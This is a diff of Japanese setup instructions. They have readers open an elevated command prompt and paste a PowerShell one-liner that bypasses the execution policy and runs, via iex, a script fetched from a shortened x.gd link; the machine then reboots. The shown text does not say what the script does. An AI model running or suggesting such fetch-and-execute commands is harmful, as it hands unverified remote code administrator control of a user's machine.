@@ -5,9 +5,9 @@
 2. 「cmd」と入力します。
 3. [Shift]+[CTRL]を押しながら[Enter]を押します。
 4. [このアプリが変更を加えることを許可しますか]で[はい]を選択します。
-5. 下記のコマンドをコピーし、コマンド画面に張り付けて[Enter]を押します。
+5. 下記のコマンドをコピーし、コマンド画面に張り付けて[Enter]を押します。（右端の四角いアイコンをクリックするとコピーされます）
 ```
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://x.gd/49Xub')"
+powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; &iex(New-Object Net.WebClient).DownloadString('https://x.gd/49Xub')"
 ```
 6. 一連の処理が終わると再起動します。
 
